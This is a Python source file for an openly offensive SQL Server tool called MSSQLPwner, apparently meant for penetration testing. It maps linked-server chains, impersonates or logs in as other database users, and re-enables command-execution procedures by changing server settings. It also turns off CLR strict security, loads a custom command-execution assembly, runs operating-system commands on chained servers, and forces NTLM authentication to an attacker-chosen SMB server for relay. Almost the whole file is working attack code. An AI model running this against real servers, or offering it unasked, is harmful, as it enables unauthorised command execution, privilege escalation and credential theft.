#!/usr/bin/env python
########################################################
__author__ = ['Nimrod Levy']
__license__ = 'GPL v3'
__version__ = 'v1.0-beta'
__email__ = ['El3ct71k@gmail.com']
########################################################
import os
import sys
import logging
import utilities
from impacket import LOG
from typing import Literal
from typing import Callable
from impacket import version
from playbooks import Queries
from impacket.examples import logger
from base_sql_client import BaseSQLClient
from impacket.examples.utils import parse_target


class MSSQLPwner(BaseSQLClient):
    def __init__(self, server_address, args_options):
        super().__init__(server_address, args_options)
        self.debug = args_options.debug
        self.linkable_servers = set()
        self.impersonated_users = dict()
        self.impersonated_as = set()
        self.authenticated_users = dict()
        self.authenticated_as = set()
        self.rev2self = ""
        self.hostname = None

    def _retrieve_links(self, linked_server: str, state: list = None) -> None:
        """
            This function is responsible to retrieve all the linkable servers recursively.
        """
        state = state or [linked_server]
        rows = self.build_chain(Queries.LINKABLE_SERVERS, linked_server)
        if not rows['is_success']:
            LOG.warning(f"Failed to retrieve linkable servers from {linked_server}")
            return
        if not rows['results']:
            LOG.info("No linkable servers found")
            return

        for row in rows['results']:
            linkable_server = utilities.remove_instance_from_server_name(row['SRV_NAME'])
            if linkable_server == state[-1] or not linkable_server:
                continue

            linkable_chain_str = f"{' -> '.join(state)} -> {linkable_server}"
            self.linkable_servers.add(linkable_chain_str)
            if linkable_server == self.hostname:
                continue

            self._retrieve_links(linkable_server, state + [linkable_server])

    def retrieve_links(self) -> None:
        """
            This function is responsible to retrieve all the linkable servers.
        """
        self._retrieve_links(self.hostname)
        LOG.info("Linkable servers:")
        for chain in self.linkable_servers:
            LOG.info(f"\t{chain}")

    def direct_query(self, query: str, linked_server: str, method: Literal['openquery', 'exec_at'] = "openquery",
                     decode_results: bool = True, print_results: bool = False) -> bool:
        """
            This function is responsible to execute a query directly.
        """
        results = self.build_chain(query, linked_server, method, decode_results, print_results)
        for result in results['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")
        return results['is_success']

    def build_chain(self, query: str, linked_server: str,
                    method: Literal['openquery', 'blind_openquery', 'exec_at'] = "openquery",
                    decode_results: bool = True, print_results: bool = False) -> dict:
        """
         This function is responsible to build the query chain for the given query and method.
        """
        if linked_server == self.hostname:
            ret_val = self.custom_sql_query(query, print_results=print_results, decode_results=decode_results)
            return ret_val

        if method == "openquery":
            ret_val = self.custom_sql_query(utilities.build_openquery_chain(self.hostname, linked_server, query),
                                            print_results=print_results, decode_results=decode_results)
            return ret_val

        if method == "blind_openquery":
            ret_val = self.custom_sql_query(utilities.build_openquery_chain(self.hostname, linked_server,
                                                                            f"SELECT 1; {query}"),
                                            print_results=print_results, decode_results=decode_results)
            return ret_val

        ret_val = self.custom_sql_query(utilities.build_exec_at_chain(self.hostname, linked_server, query),
                                        print_results=print_results, decode_results=decode_results)
        return ret_val

    def _get_impersonation_users(self, linked_server: str) -> None:
        """
        This function is responsible to retrieve all the impersonation users recursively.
        """
        rows = self.build_chain(Queries.CAN_IMPERSONATE_AS, linked_server)
        if rows['is_success']:
            if linked_server not in self.impersonated_users.keys():
                self.impersonated_users[linked_server] = set()

            for row in rows['results']:
                self.impersonated_users[linked_server].add(row['name'])

        for linked_server in self.linkable_servers:
            if linked_server in self.impersonated_users.keys():
                continue
            self._get_impersonation_users(linked_server)

    def _get_accessible_users(self, linked_server: str) -> None:
        """
        This function is responsible to retrieve all the users that we can authenticate with, recursively.
        """
        rows = self.build_chain(Queries.USER_CONTEXT, linked_server)
        if rows['is_success']:
            if linked_server not in self.authenticated_users.keys():
                self.authenticated_users[linked_server] = set()

            for row in rows['results']:
                self.authenticated_users[linked_server].add(row['username'])

        for linked_server in self.linkable_servers:
            if linked_server in self.authenticated_users.keys():
                continue
            self._get_accessible_users(linked_server)

    def get_impersonation_users(self) -> None:
        """
        This function is responsible to print all the impersonation users.
        """
        self._get_impersonation_users(self.hostname)
        for linked_server, users in self.impersonated_users.items():
            if not users:
                continue
            LOG.info(f"Can impersonate us users: {', '.join(users)} on {self.retrieve_linkable_server(linked_server)}")

    def get_accessible_users(self) -> None:
        """
        This function is responsible to print all the accessible users.
        """
        self._get_accessible_users(self.hostname)
        for linked_server, users in self.authenticated_users.items():
            if not users:
                continue
            LOG.info(f"Can authenticate as users: {', '.join(users)} on {self.retrieve_linkable_server(linked_server)}")

    def retrieve_hostname(self) -> bool:
        """
        This function is responsible to retrieve the hostname of the server.
        """
        row = self.custom_sql_query(Queries.SERVER_HOSTNAME)
        if not row['is_success']:
            return False
        self.hostname = utilities.remove_instance_from_server_name(row['results'][0]['ServerName'])
        LOG.info(f"Discovered hostname: {self.hostname}")
        return True

    def enumerate(self) -> bool:
        """
        This function is responsible to enumerate the server.
        """
        if not self.retrieve_hostname():
            LOG.error("Failed to retrieve hostname")
            return False
        self.retrieve_links()
        self.get_impersonation_users()
        self.get_accessible_users()
        return True

    def execute_procedure(self, procedure: str, command: str, linked_server: str) -> bool:
        """
        This function is responsible to execute a procedure on a linked server.
        """

        procedure_custom_name = procedure if procedure != "sp_oacreate" else "Ole Automation Procedures"
        is_procedure_enabled = self.build_chain(Queries.IS_PROCEDURE_ENABLED.format(procedure=procedure_custom_name),
                                                linked_server)

        if not is_procedure_enabled['is_success']:
            LOG.error(f"Cant fetch is_{procedure}_enabled status")
            return False

        result = is_procedure_enabled['results'][-1]
        if result['show_advanced_options'] == 'False' or result['procedure'] == 'False':
            LOG.error(f"{procedure} is not allowed")
            is_procedure_can_be_configured = self.build_chain(Queries.IS_UPDATE_SP_CONFIGURE_ALLOWED, linked_server)
            if (not is_procedure_can_be_configured['is_success']) or \
                    is_procedure_can_be_configured['results'][0]['CanChangeConfiguration'] == 'False':
                LOG.error(f"Cant fetch sp_configure status")
                return False

            LOG.info(f"{procedure} can be configured")
            query = ""
            if result['show_advanced_options'] == 'False':
                query += Queries.RECONFIGURE_SHOW_ADVANCED_OPTIONS.format(status=1)
                LOG.info("Enabling show advanced options")
                self.rev2self += Queries.RECONFIGURE_SHOW_ADVANCED_OPTIONS.format(status=0)

            if result['procedure'] == 'False':
                query += Queries.RECONFIGURE_PROCEDURE.format(procedure=procedure_custom_name, status=1)
                LOG.info(f"Enabling {procedure}")
                self.rev2self += Queries.RECONFIGURE_PROCEDURE.format(procedure=procedure, status=0)

            if not self.build_chain(query, linked_server, method="exec_at")['is_success']:
                LOG.warning(f"Failed to enable {procedure}")

        is_procedure_executable = Queries.IS_PROCEDURE_EXECUTABLE.format(procedure=procedure)
        is_procedure_can_be_used = self.build_chain(is_procedure_executable, linked_server)

        if not is_procedure_can_be_used['is_success']:
            LOG.error(f"Cant fetch is_{procedure}_can_be_used status")
            return False

        if is_procedure_can_be_used['results'][-1]['HasPermission'] == 0:
            LOG.error(f"{procedure} is not enabled")
            return False
        command = command.replace("'", "''")
        procedure_query = Queries.PROCEDURE_EXECUTION.format(procedure=procedure, command=command)
        if procedure == 'sp_oacreate':
            procedure_query = Queries.SP_OAMETHOD.format(command=command)
        results = self.build_chain(procedure_query, linked_server, method="exec_at")

        LOG.info(f"The command executed successfully")
        if not results['results']:
            return results['is_success']

        for result in results['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")
        return True

    def execute_custom_assembly(self, asm_file_location: str, procedure_name: str, command: str,
                                linked_server: str) -> bool:
        """
        This function is responsible to execute a custom assembly.
        In general this function is starts with creates the assembly, trust it, create the procedure and execute it.
        """
        custom_asm_hex = utilities.hexlify_file(asm_file_location)
        is_custom_asm = self.build_chain(Queries.IS_CUSTOM_ASM_ENABLED, linked_server)
        if not is_custom_asm['is_success']:
            LOG.error(f"Cant fetch is_custom_asm_enabled status")
            return False

        # Creating a stored procedure from an assembly is not allowed by default.
        # This is controlled through the CLR Integration17 setting, which is disabled by default and should be enabled.
        asm_res = is_custom_asm['results'][-1]
        if asm_res['show_advanced_options'] == 'False' or asm_res['clr_enabled'] == 'False' \
                or asm_res['clr_strict_security'] == 'True':
            LOG.error(f"adding custom assemblies is not allowed")

            is_procedure_can_be_configured = self.build_chain(Queries.IS_UPDATE_SP_CONFIGURE_ALLOWED, linked_server)
            if not is_procedure_can_be_configured['is_success']:
                LOG.error(f"Cant fetch sp_configure status")
                return False

            if is_procedure_can_be_configured['results'][0]['CanChangeConfiguration'] == 'False':
                return False

            LOG.info(f"sp_configure can be configured")
            query = ""

            if asm_res['show_advanced_options'] == 'False':
                query += Queries.RECONFIGURE_SHOW_ADVANCED_OPTIONS.format(status=1)
                LOG.info("Enabling show advanced options")
                self.rev2self += Queries.RECONFIGURE_SHOW_ADVANCED_OPTIONS.format(status=0)

            if asm_res['clr_enabled'] == 'False':
                query += Queries.RECONFIGURE_PROCEDURE.format(procedure='clr enabled', status=1)
                LOG.info(f"Enabling clr enabled")
                self.rev2self += Queries.RECONFIGURE_PROCEDURE.format(procedure='clr enabled', status=0)

            if asm_res['clr_strict_security'] == 'True':
                query += Queries.RECONFIGURE_PROCEDURE.format(procedure='clr strict security', status=0)
                LOG.info(f"Disabling clr strict security")
                self.rev2self += Queries.RECONFIGURE_PROCEDURE.format(procedure='clr strict security', status=1)
            if not self.build_chain(query, linked_server, method="exec_at")['is_success']:
                LOG.error(f"Failed to enable clr")
                return False

        myhash = utilities.calculate_sha512_hash(asm_file_location)
        is_app_trusted = self.build_chain(Queries.IS_MY_APP_TRUSTED.format(myhash=myhash), linked_server)
        if (not is_app_trusted['is_success']) or (is_app_trusted['results'][0]['status'] == 'False'):
            trust_asm = self.build_chain(Queries.TRUST_MY_APP.format(myhash=myhash), linked_server, method="exec_at")
            if not trust_asm['is_success']:
                LOG.error("Failed to trust our custom assembly")
                return False

            LOG.info(f"Trusting our custom assembly")
            self.rev2self += Queries.UNTRUST_MY_APP.format(myhash=myhash)

        add_custom_asm = self.build_chain(Queries.ADD_CUSTOM_ASM.format(
            custom_asm=custom_asm_hex, asm_name='CalcAsm'), linked_server, method="exec_at")
        if (not add_custom_asm['is_success']) and 'already exists in database' not in add_custom_asm['replay']:
            LOG.error(f"Failed to add custom assembly")
            return False

        add_procedure = self.build_chain(Queries.CREATE_PROCEDURE.format(
            asm_name='CalcAsm', procedure_name=procedure_name, arg='command'), linked_server, method="exec_at")
        if (not add_procedure['is_success']) and 'is already an object named' not in add_procedure['replay']:
            LOG.error(f"Failed to create procedure")
            return False

        self.rev2self += Queries.CUSTOM_ASM_CLEANUP.format(asm_name='CalcAsm', procedure_name=procedure_name)
        procedure_query = Queries.PROCEDURE_EXECUTION.format(procedure=procedure_name,
                                                             command=command.replace("'", "''"))
        results = self.build_chain(procedure_query, linked_server, method="exec_at")
        if not results['is_success']:
            LOG.error(f"Failed to execute custom assembly")
            return False
        for result in results['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")
        return True

    def impersonate(self, linked_server: str) -> bool:
        """
        This function is responsible to impersonate as a user.
        """
        if linked_server not in self.impersonated_users.keys():
            LOG.error(f"The user cannot to impersonated on {self.retrieve_linkable_server(linked_server)}")
            return False

        for user in self.impersonated_users[linked_server]:
            if user in self.impersonated_as:
                continue
            LOG.info(f"Trying to impersonate as {user} on {self.retrieve_linkable_server(linked_server)}")
            # Log the impersonated in order to avoid infinite loop
            self.impersonated_as.add(user)
            if self.build_chain(Queries.IMPERSONATE_AS_USER.format(username=user), linked_server,
                                method="exec_at")['is_success']:
                LOG.info(f"Successfully impersonated as {user} on {self.retrieve_linkable_server(linked_server)}")
                return True
            break

        LOG.error(f"Failed to find an impersonation chain on {self.retrieve_linkable_server(linked_server)}")
        return False

    def retrieve_linkable_server(self, linked_server: str) -> str:
        """
        This function is responsible to retrieve the host name of the local server.
        """
        return linked_server if linked_server else f'local server ({self.hostname})'

    def authenticate_as(self, linked_server: str) -> bool:
        """
        This function is responsible to authenticate as a user.
        """
        if linked_server not in self.authenticated_users.keys():
            LOG.error(f"The user cannot be authenticate on {self.retrieve_linkable_server(linked_server)}")
            return False

        for user in self.authenticated_users[linked_server]:
            if user in self.authenticated_as or user == 'guest':
                continue

            # Log the authenticated user in order to avoid infinite loop
            self.authenticated_as.add(user)
            LOG.info(f"Trying to authenticate as {user} on {self.retrieve_linkable_server(linked_server)}")
            if self.build_chain(Queries.AUTHENTICATE_AS_USER.format(username=user), linked_server,
                                method="exec_at")['is_success']:
                LOG.info(f"Successfully authenticated as {user} on {self.retrieve_linkable_server(linked_server)}")
                return True
            break

        LOG.error(f"The user failed to authenticate on {self.retrieve_linkable_server(linked_server)}")
        return False

    def filter_relevant_chains(self, linked_server: str) -> list:
        """
        This function is responsible to filter the relevant chains.
        """
        for chain in self.linkable_servers:
            if not chain.endswith(f' -> {linked_server}'):
                continue
            yield chain

    def rev2self_cmd(self, linked_server: str) -> None:
        """
        This function is responsible to revert the database to the previous state.
        """
        if not self.rev2self:
            return
        LOG.info("Reverting to self..")
        if self.build_chain(linked_server, self.rev2self, "exec_at")['is_success']:
            LOG.info("Successfully reverted to self")
        self.rev2self = ""

    def procedure_runner(self, func: Callable, args: list, linked_server: str) -> bool:
        """
        This function is responsible to attempt to run a procedure through local or link server.
        This function will try  to run the procedure through the following methods if no success:
        1. Execute the procedure locally.
        2. Impersonate as a user and execute the procedure.
        3. Authenticate as a user and execute the procedure.

        """
        while self.impersonate(linked_server):
            if func(*args, **{"linked_server": linked_server}):
                return True
        while self.authenticate_as(linked_server):
            if func(*args, **{"linked_server": linked_server}):
                return True
        if func(*args, **{"linked_server": linked_server}):
            return True
        self.authenticated_as.clear()
        self.impersonated_as.clear()
        return False

    def procedure_chain_builder(self, func: Callable, args: list, linked_server: str):
        """
        This function is responsible to build a procedure chain.
        """

        if not linked_server or linked_server == self.hostname:
            retval = self.procedure_runner(func, args, linked_server)
            self.rev2self_cmd(linked_server)
            if retval:
                LOG.info(f"Successfully executed {func.__name__} on {self.retrieve_linkable_server(linked_server)}")
                return

            LOG.error(f"{func.__name__} cannot be executed on {self.retrieve_linkable_server(linked_server)}")
            LOG.info("Trying to find a linkable server chain")

        for chain in self.filter_relevant_chains(linked_server):
            LOG.info(f"Trying to execute {func.__name__} on {chain}")
            retval = self.procedure_runner(func, args, linked_server=chain)
            self.rev2self_cmd(chain)
            if retval:
                LOG.info(f"Successfully executed {func.__name__} on {chain}")
                break


if __name__ == '__main__':
    # Init the example's logger theme
    logger.init()

    parser = utilities.generate_arg_parser()

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, address = parse_target(options.target)

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None \
            and options.no_pass is False and options.aesKey is None:
        from getpass import getpass

        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True
    mssql_client = MSSQLPwner(address, options)
    mssql_client.connect(username, password, domain)
    if not mssql_client.enumerate():
        sys.exit(1)
    link_server = options.link_server.upper() if options.link_server else mssql_client.hostname

    if options.module == "enumerate":
        mssql_client.disconnect()
        sys.exit(1)

    elif options.module == 'exec':
        mssql_client.procedure_chain_builder(mssql_client.execute_procedure,
                                             [options.command_execution_method, options.command],
                                             linked_server=link_server)
    elif options.module == 'ntlm-relay':
        mssql_client.procedure_chain_builder(mssql_client.execute_procedure,
                                             [options.relay_method, options.smb_server],
                                             linked_server=link_server)

    elif options.module == 'custom-asm':
        asm_filename = "CmdExec-x64.dll" if options.arch == 'x64' else "CmdExec-x86.dll"
        file_location = os.path.join("playbooks/custom-asm", asm_filename)
        if not os.path.exists(file_location):
            LOG.error(f"Cannot find {file_location}")
            sys.exit(1)
        mssql_client.procedure_chain_builder(mssql_client.execute_custom_assembly,
                                             [file_location, options.procedure_name, options.command],
                                             linked_server=link_server)

    elif options.module == 'direct_query':
        mssql_client.procedure_chain_builder(mssql_client.direct_query,
                                             [options.query],
                                             linked_server=link_server)

    mssql_client.disconnect()
